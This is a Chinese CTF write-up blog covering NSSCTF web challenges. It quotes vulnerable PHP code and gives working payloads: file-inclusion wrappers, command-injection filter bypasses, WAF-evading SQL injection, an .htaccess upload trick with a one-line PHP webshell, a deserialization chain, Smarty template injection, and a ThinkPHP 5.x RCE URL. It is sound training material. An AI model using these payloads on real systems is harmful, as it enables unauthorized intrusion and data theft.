+++
date = '2025-07-28T17:10:00+08:00'
draft = false
title = 'NSSCTF的部分题目WriteUP'
categories = ['WriteUP']
tags = ['WriteUP', 'NSSCTF']

+++

# Web
## [SWPUCTF 2021 新生赛]include

<!--more-->

```php
<?php  
ini_set("allow_url_include","on");  
header("Content-type: text/html; charset=utf-8");  
error_reporting(0);  
$file=$_GET['file'];  
if(isset($file)){    
	show_source(__FILE__);  
    echo 'flag 在flag.php中';  
}
else{  
    echo "传入一个file试试";  
}  
echo "</br>";  
echo "</br>";  
echo "</br>";  
echo "</br>";  
echo "</br>";  
include_once($file);  
?>
```
- 源代码中显示 `allow_url_include` 开启，在开启 `allow_url_include` 配置项后，PHP 将能够通过 `include` 等函数**将远程文件包含至当前文件并将其作为 PHP 代码进行执行**。    
- 而开启 `allow_url_fopen` 配置项后，PHP **仅能够对远程文件进行读写等文件操作**。    
- 然后可以使用 PHP 伪协议来进行一系列的操作
### PHP 伪协议
- PHP 支持的伪协议
```TEXT
1 file:// — 访问本地文件系统
2 http:// — 访问 HTTP(s) 网址
3 ftp:// — 访问 FTP(s) URLs
4 php:// — 访问各个输入/输出流（I/O streams）
5 zlib:// — 压缩流
6 data:// — 数据（RFC 2397）
7 glob:// — 查找匹配的文件路径模式
8 phar:// — PHP 归档
9 ssh2:// — Secure Shell 2
10 rar:// — RAR
11 ogg:// — 音频流
12 expect:// — 处理交互式的流
```
- `php://filter` 可以获取指定文件源码。当它与包含函数结合时，`php://filter` 流会被当作 php 文件执行。所以我们一般对其进行编码，让其不执行，从而导致任意文件读取。    
- 包含函数有 `require()`、`require_once()`、`include()`、`include_once()` 等。
```TEXT
# 这里对数据流用了base64编码，所以与包含函数结合时，不会运行源文件，进而任意文件读取。
php://filter/convert.base64-encode/resource=hint.php
# 而这个读的同时如果和包含函数结合，就会执行该文件。（如果能执行的话）
php://filter/resource=index.php
```

## [SWPUCTF 2021 新生赛]PseudoProtocols
- 接上一题，这题要用到另一种伪协议 `data://`。
```php
<?php  
ini_set("max_execution_time", "180");  
show_source(__FILE__);  
include('flag.php');  
$a= $_GET["a"];  
if(isset($a)&&(file_get_contents($a,'r')) === 'I want flag'){  
    echo "success\n";  
    echo $flag;  
}  
?>
```
Payload：
```TEXT
/?a=data://text/plain;base64,SSB3YW50IGZsYWc=
```

## [SWPUCTF 2021 新生赛]easyupload2.0
- 题目对文件头和后缀进行检查，对所有后缀含有 `.php` 的全部 ban 掉了。    
- 所以，我们可以将后缀改为 `.phtml` 即可绕过限制。

## [SWPUCTF 2021 新生赛]easyupload3.0
- 这题对文件内容没有限制，但不能上传 php 文件。    
- 同时，这题可以上传 `.htaccess` 文件，那么我们就可以将“马”与该文件配合，让服务器将“马”（图片）解析为 `php` 文件即可完成注入。
```TEXT
// .htaccess
<FilesMatch "1.png">
SetHandler application/x-httpd-php
</FilesMatch>
```
- 之后，再将“马”的文件名改成 `1.png` 上传即可。


## [NISACTF 2022]easyssrf
- 首先，页面有一个可以执行 curl 的输入框，尝试用该功能看 `flag.php`。
- 出现提示可以去看 `/fl4g` 文件，看完之后提示可以看 `ha1x1ux1u.php` 页面。
而读取页面有以下代码：
```php
<?php

highlight_file(__FILE__);
error_reporting(0);

// stristr()搜索第一次出现的字符串，并返回该字符串后面的字符
$file = $_GET["file"];
if (stristr($file, "file")){
	die("你败了.");
}

//flag in /flag
echo file_get_contents($file);
?>
```
Payload：
```
/ha1x1ux1u.php?file=php://filter/resource=/flag
```

## [BJDCTF 2020]easy_md5
- 题目提示
```TEXT
hint: select * from 'admin' where password=md5($pass,true)
```
>这里面 password 就是我们用户框中输入得东西，如果通过md5之后返回字符串是 `'or 1` 的话，就形成一个永真条件。    

而所谓的万能密码 `ffifdyop` 就是经过 md5 加密后的值为 `276f722736c95d99e921722cf9ed621c`，而该字符串 hex 转 ascii 后的 `276f722736`，刚好是 `'or'6` ，所以拼接之后的形式是 `select * from 'admin' where password=''or'6xxxxx'` 刚好就等价一个永真式，所以就能绕过 md5 函数了。

- 之后就是简单的数组绕过即可。

## [suctf 2019]EasySQL
- 首先，尝试各种注入后发现无果，最后尝试堆叠注入就成功了。
```SQL
1;show databases#
```
- 然后继续查表。
```SQL
1;show tables#
```
- 但是接下来的 `1;select columns from 'Flag'#` 却不行了。    
```TEXT
1、输入非零数字得到的回显1和输入其余字符得不到回显=>来判断出内部的查询语句可能存在有||
2、也就是select 输入的数据 || 内置的一个列名 from 表名=>即为 select  $_POST['query'] || flag from Flag
```
>看了 WP 后才知道要猜它原来后端的查询语句的结构是什么样的。    

Payload：    
1、可以直接 `*,1`，语句拼接后为 `select *,1 || flag from Flag`。    
2、官方给的 payload 是 `1;set sql_mode=PIPES_AS_CONCAT;select 1`。    
- 关于 `sql_mode` : 它定义了 MySQL 应支持的 SQL 语法，以及应该在数据上执行何种确认检查，其中的 `PIPES_AS_CONCAT` 将 `||` 视为字符串的连接操作符而非 “或” 运算符。

## [GXYCTF 2019]Ping Ping Ping
- 根据题目意思，输入地址执行了 `ping` 命令，所以我们考虑这里能通过拼接执行其他命令。    
- 尝试 `;ls`，发现存在 `flag.php` 文件，尝试直接读取，发现存在空格过滤。    
- 之后尝试以下命令。
```bash
;cat<>flag.php      // 过滤了<>
;cat${IFS}$flag.php // 过滤了{}
;cat$IFS$1flag.php  // 过滤了flag
```
- 那么我们执行 `;cat$IFS$1index.php` 来查看源代码，以获取过滤规则，来思考如何绕过。
```php
<?php
if(isset($_GET['ip'])){
	$ip = $_GET['ip'];
	if(preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{1f}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match)){
		print_r($match);
		print($ip);
		echo preg_match("/\&|\/|\?|\*|\<|[\x{00}-\x{20}]|\>|\'|\"|\\|\(|\)|\[|\]|\{|\}/", $ip, $match);
		die("fxck your symbol!");
	}
	else if(preg_match("/ /", $ip)){
		die("fxck your space!");
	}
	else if(preg_match("/bash/", $ip)){
		die("fxck your bash!");
	}
	else if(preg_match("/.*f.*l.*a.*g.*/", $ip)){
		die("fxck your flag!");
	}
	$a = shell_exec("ping -c 4 ".$ip);
	echo "<pre>";
	print_r($a);
}
?>
```
Payload：
```TEXT
1、?ip=127.0.0.1;cat$IFS$9`ls`
2、?ip=127.0.0.1;a=g;cat$IFS$1fla$a.php
3、?ip=127.0.0.1;echo$IFS$1Y2F0IGZsYWcucGhw|base64$IFS$1-d|sh
```

### 关键词绕过小结
```TEXT
${IFS}$9
{IFS}
$IFS
${IFS}
$IFS$1           //$1改成$加其他数字貌似都行
IFS
<
<> 
{cat,flag.php}   //用逗号实现了空格功能，需要用{}括起来
%20   (space)
%09   (tab)
X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）
```
### 内联执行绕过（就是将反引号内命令的输出作为输入执行）
```TEXT
?ip=127.0.0.1;cat$IFS$9`ls`

$IFS在Linux下表示为空格
$9是当前系统shell进程第九个参数持有者，始终为空字符串，$后可以接任意数字
这里$IFS$9或$IFS垂直，后面加个$与{}类似，起截断作用
```

## [SWPUCTF 2021 新生赛]hardrce
- 题目源码
```php
<?php  
header("Content-Type:text/html;charset=utf-8");  
error_reporting(0);  
highlight_file(__FILE__);  
if(isset($_GET['wllm']))  
{    
	$wllm = $_GET['wllm'];
	$blacklist = [' ','\t','\r','\n','\+','\[','\^','\]','\"','\-','\$','\*','\?','\<','\>','\=','\`',];  
    foreach ($blacklist as $blackitem)  
    {  
        if (preg_match('/' . $blackitem . '/m', $wllm)) {  
        die("LTLT说不能用这些奇奇怪怪的符号哦！");  
    	}
    }  
	if(preg_match('/[a-zA-Z]/is',$wllm))  
	{  
    	die("Ra's Al Ghul说不能用字母哦！");  
	}  
	echo "NoVic4说：不错哦小伙子，可你能拿到flag吗？";  
	eval($wllm);  
}  
else  
{  
    echo "蔡总说：注意审题！！！";  
}  
?>
```
- 这里过滤了大部分的字符，所以我们不能使用常规的绕过方法。    
- 又因为这里过滤了 ^ 和\`，所以我们就不能使用异或和或运算，那就只剩取反了。    
Payload：
```php
<?php
    $a = "system";
    $b = "cat /f*";
    echo "(~".urlencode(~$a).")";
    echo "(~".urlencode(~$b).");";
?>
// 执行结果为：(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%D5);
```

## [SWPUCTF 2021 新生赛]pop
- 题目源码
```php
<?php

error_reporting(0);
show_source("index.php");

class w44m{

    private $admin = 'aaa';
    protected $passwd = '123456';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$w00m = $_GET['w00m'];
unserialize($w00m);
?> 
```
Payload：
```php
<?php

class w44m{
    private $admin = 'w44m';
    protected $passwd = '08067';

    public function Getflag(){
        if($this->admin === 'w44m' && $this->passwd ==='08067'){
            include('flag.php');
            echo $flag;
        }else{
            echo $this->admin;
            echo $this->passwd;
            echo 'nono';
        }
    }
}

class w22m{
    public $w00m;
    public function __destruct(){
        echo $this->w00m;
    }
}

class w33m{
    public $w00m;
    public $w22m;
    public function __toString(){
        $this->w00m->{$this->w22m}();
        return 0;
    }
}

$a = new w22m();
$b = new w33m();
$c = new w44m();

$a -> w00m = $b;
$b -> w00m = $c;
$b -> w22m = 'Getflag';

echo urlencode(serialize($a));
?>
```
> 这里的 `admin`、`passwd` 两个参数受到保护，所以要在类中直接修改，不能传参修改！

## [SWPUCTF 2021 新生赛]sql
- 测试一下，sqlmap 不能自动注入，有 WAF 要手动绕过。    
- 测试发现这题对空格和等号进行了过滤，测试发现在第二处有回显。
```SQL
/?wllm=-1%27/**/union/**/select/**/1,showbase(),1%23
```
Payload：
```SQL
/?wllm=-1%27/**/union/**/select/**/1,group_concat(table_name),1/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/'test_db'%23
/?wllm=-1%27/**/union/**/select/**/1,group_concat(column_name),1/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/'LTLT_flag'%23
/?wllm=-1%27/**/union/**/select/**/1,flag,1/**/from/**/test_db.LTLT_flag%23
/*这里flag太长了，需要用mid()函数来截取flag。*/
/?wllm=-1%27/**/union/**/select/**/1,mid(flag,21,20),1/**/from/**/test_db.LTLT_flag%23
```

## [SWPUCTF 2021 新生赛]finalrce
- 题目源码
```php
<?php  
highlight_file(__FILE__);  
if(isset($_GET['url']))  
{    
	$url=$_GET['url'];
	if(preg_match('/bash|nc|wget|ping|ls|cat|more|less|phpinfo|base64|echo|php|python|mv|cp|la|\-|\*|\"|\>|\<|\%|\$/i',$url))  
    {  
        echo "Sorry,you can't use this.";  
    }  
    else  
    {  
        echo "Can you see anything?";
        exec($url);  
    }  
}
```
- 因为这里是 `exec` 所以执行命令后不回显，我们可以构造命令 `l''s /;sleep 5` 来测试命令是否执行成功，尝试后发现命令成功执行，我们需要对其进一步利用以获取 flag。    
- 可以将结果使用 `tee` 命令输出到 `txt` 中，然后访问 `txt` 来查看命令执行的结果。
```bash
l''s /|tee 1.txt
ca''t flllll''aaaaaaggggggg|tee 2.txt
```

## [鹏城杯 2022]简单包含
- 题目源码
```php
<?php 
	$path = $_POST["flag"];
	if (strlen(file_get_contents('php://input')) < 800 && preg_match('/flag/', $path)) 
	{ 
		echo 'nssctf waf!'; 
	} 
	else 
	{ 
		@include($path); 
	} 
?> 

<?php   
highlight_file(__FILE__);  
include($_POST["flag"]);
// flag in /var/www/html/flag.php;
?>
```
Payload：
```TEXT
a=a(800个a)&flag=php://filter/convert.base64-encode/resource=flag.php
```

## [NSSCTF 2022 Spring Recruit]babyphp
- 题目源码
```php
<?php
highlight_file(__FILE__);
include_once('flag.php');
if(isset($_POST['a'])&&!preg_match('/[0-9]/',$_POST['a'])&&intval($_POST['a'])){
    if(isset($_POST['b1'])&&$_POST['b2']){
        if($_POST['b1']!=$_POST['b2']&&md5($_POST['b1'])===md5($_POST['b2'])){
            if($_POST['c1']!=$_POST['c2']&&is_string($_POST['c1'])&&is_string($_POST['c2'])&&md5($_POST['c1'])==md5($_POST['c2'])){
                echo $flag;
            }else{
                echo "yee";
            }
        }else{
            echo "nop";
        }
    }else{
        echo "go on";
    }
}else{
    echo "let's get some php";
}
?>
```
- 这里有 `intval()` 函数作用是获取变量的整数值，也是强制类型转换。 #intval绕过    
绕过思路：    
- 1、使用八进制或十六进制来表示被禁止使用的数字。
- 2、传递一个非空数组，这样就能使该函数返回 `1`，从而绕过。

## [鹤城杯 2021]EasyP
- 题目源码
```php
<?php
include 'utils.php';

if (isset($_POST['guess'])) {
    $guess = (string) $_POST['guess'];
    if ($guess === $secret) {
        $message = 'Congratulations! The flag is: ' . $flag;
    } else {
        $message = 'Wrong. Try Again';
    }
}

if (preg_match('/utils\.php\/*$/i', $_SERVER['PHP_SELF'])) {
    exit("hacker :)");
}

if (preg_match('/show_source/', $_SERVER['REQUEST_URI'])){
    exit("hacker :)");
}

if (isset($_GET['show_source'])) {
    highlight_file(basename($_SERVER['PHP_SELF']));
    exit();
}
else{
    show_source(__FILE__);
}
?> 
```
- 首先我们要了解一下 `$_SERVER` 参数。    
```TEXT
案例网址：https://www.shawroot.cc/php/index.php/test/foo?username=root $_SERVER['PHP_SELF'] 得到：/php/index.php/test/foo 
$_SERVER['REQUEST_URI'] 得到：/php/index.php/test/foo?username=root
```
Payload：
```TEXT
/index.php/utils.php/%a0?show+source=1
```
**为什么前面需要添加一个 `/index.php` 呢？**
- 因为当我们传入 `index.php/utils.php` 时，仍然请求的是 `index.php`。
- 但是当 `basename()` 处理后，`highlight_file()` 得到的参数就变成了 `utils.php`，从而我们就实现了任意文件包含。

## [CISCN 2019华东南]Web11
- 看到可以获取 IP，联想到可以伪造 XFF。    
- 看到页尾有 `Smarty`，就能联想到这是 PHP 模板注入。    
![[Picture/屏幕截图 2024-10-23 160853.png]]
Payload：
```
X-Forwarded-For: {system('cat /flag')}
```

## [强网杯 2019]随便注
```TEXT
1';show databases#
1';use supersqli;show tables#
1';use supersqli;desc `1919810931114514`# // 发现看不了数据
1';use supersqli;select flag from `1919810931114514`# //发现也看不了
```
Payload：
```
// 第一种，用十六进制编码绕过
1';SeT @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;prepare execsql from @a;execute execsql#
// 第二种，用其他函数绕过
1';handler `1919810931114514` open;handler `1919810931114514` read next#
```

## [GXYCTF 2019]BabyUpload
- 图片上传，尝试过一圈后发现只能传 jpg，还有 MIME 检测。    
- 尝试上传 `.htaccess` 文件，来使 jpg 被解析成 php，但后面发现其对 `<?>` 有检测，所以在看过 WP 后知道要修改 `.htaccess` 文件。
```TEXT
<FilesMatch "1.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```
- 将图片马修改为
```JPG
GIF89a
<script language='php'>
system($_POST['zhu']);
show_source("/flag");
</script>
```
- 上传即可！    

## [SWPUCTF 2022 新生赛]ez_rce
- 扫目录，发现 `robots.txt`，访问对应目录，发现是 `ThinkPHP`，再用工具一扫。     
- 存在 ThinkPHP 5.0.22/5.1.29 RCE，Payload：
```URL
/?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=ls;
```
- 发现 flag 不在 `/flag` 里，出题人把 flag 藏起来了，再仔细查看发现有 `/nss` 目录，那么再进一步探索发现 flag 在 `/nss/ctf/flag/flag` 里面。    

## [鹤城杯 2021]Middle magic
- 题目源码
```php
<?php
highlight_file(__FILE__);
include "./flag.php";
include "./result.php";
if(isset($_GET['aaa']) && strlen($_GET['aaa']) < 20){

    $aaa = preg_replace('/^(.*)level(.*)$/', '${1}<!-- filtered -->${2}', $_GET['aaa']);

    if(preg_match('/pass_the_level_1#/', $aaa)){
        echo "here is level 2";
        
        if (isset($_POST['admin']) and isset($_POST['root_pwd'])) {
            if ($_POST['admin'] == $_POST['root_pwd'])
                echo '<p>The level 2 can not pass!</p>';
        // START FORM PROCESSING    
            else if (sha1($_POST['admin']) === sha1($_POST['root_pwd'])){
                echo "here is level 3,do you kown how to overcome it?";
                if (isset($_POST['level_3'])) {
                    $level_3 = json_decode($_POST['level_3']);
                    
                    if ($level_3->result == $result) {
                        
                        echo "success:".$flag;
                    }
                    else {
                        echo "you never beat me!";
                    }
                }
                else{
                    echo "out";
                }
            }
            else{
                
                die("no");
            }
        // perform validations on the form data
        }
        else{
            echo '<p>out!</p>';
        }
    }
    else{
        echo 'nonono!';
    }
    echo '<hr>';
}
?>
```
- 首先，第一个判断处由于其没有多行匹配 `/m`，所以我们可以使用换行符来绕过。
```TEXT
/?aaa=%0Apass_the_level_1%23
```
- 第二处有 `sha()` 加密，所以我们直接使用数组绕过。
```TEXT
admin[]=1&root_pwd[]=2
```
- 最后，直接猜测 `$result='flag'`，直接传 json。
```TEXT
{"result": "flag"}
```

## [WUSTCTF 2020]朴实无华
- 题目源码
```php
<?php
header('Content-type:text/html;charset=utf-8');
error_reporting(0);
highlight_file(__file__);

//level 1
if (isset($_GET['num'])){
    $num = $_GET['num'];
    if(intval($num) < 2020 && intval($num + 1) > 2021){
        echo "我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>";
    }else{
        die("金钱解决不了穷人的本质问题");
    }
}else{
    die("去非洲吧");
}

//level 2
if (isset($_GET['md5'])){
   $md5=$_GET['md5'];
   if ($md5==md5($md5))
       echo "想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>";
   else
       die("我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲");
}else{
    die("去非洲吧");
}

//get flag
if (isset($_GET['get_flag'])){
    $get_flag = $_GET['get_flag'];
    if(!strstr($get_flag," ")){
        $get_flag = str_ireplace("cat", "wctf2020", $get_flag);
        echo "想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>";
        system($get_flag);
    }else{
        die("快到非洲了");
    }
}else{
    die("去非洲吧");
}
?>
```
- 这里第一处的绕过非常巧妙，`intval()` 函数能强制转换数据为整数，我们需要构造一个能满足条件的特别的数字，又因为该函数会直接忽略非数字字符后的内容，那么我们就能想到构造浮点数去绕过。
```TEXT
?num=2019e8
```
- 第二个 md5 就简单的 `0e` 绕过即可，而最后直接空格绕过，然后命令执行即可。    
Payload：
```	TEXT
?num=2019e8&md5=0e215962017&get_flag=tac<>fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag
```

## [SWPUCTF 2022 新生赛]ez_sql
- 尝试联合注入，发现报错，且空格和 union 被消除。
```TEXT
-1' union select 1,2%23
```
- 想办法绕过，通过隔开字符成功绕过。
```TEXT
-1'/**/ununionion/**/select/**/1,2,3%23
/*第一行没有内容，所以我们来看第二行*/
-1'/**/ununionion/**/select/**/1,2,3/**/limit/**/1,1%23  
```
- 按常规流程注入，但发现 or 也会被过滤，所以要再次构造。
```TEXT
-1'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1%23

-1'/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'/**/limit/**/1,1%23

-1'/**/ununionion/**/select/**/id,group_concat(Secr3t),group_concat(flll444g)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1%23
```
>换行：`limit/**/1,1#`

## [MoeCTF 2021]babyRCE
- 查看页面源代码可以传参 `rce`，但是有过滤。

Payload：
```bash
ca\t${IFS}fl\ag.php
```

## [SWPUCTF 2022 新生赛]numgame
- 题目部分源码
```PHP
<?php  
error_reporting(0);  
// hint: 与get相似的另一种请求协议是什么呢  
include("flag.php");  
class nss{  
    static function ctf(){  
        include("./hint2.php");  
    }  
}  
if(isset($_GET['p'])){  
    if (preg_match("/n|c/m",$_GET['p'], $matches))  
        die("no");    
    call_user_func($_GET['p']);    
}
else{    
	highlight_file(__FILE__);  
}
?>
```
- 第一个提示是指用 GET 和 POST 都可以出答案。      

- 这里的正则不匹配大小写，所以可以大写绕过，访问 `hint2.php` 提示说类是 `nss2`。    

Payload：
```TEXT
?p=Nss2::Ctf      // GET
p[]=Nss2&p[]=Ctf  // POST
```
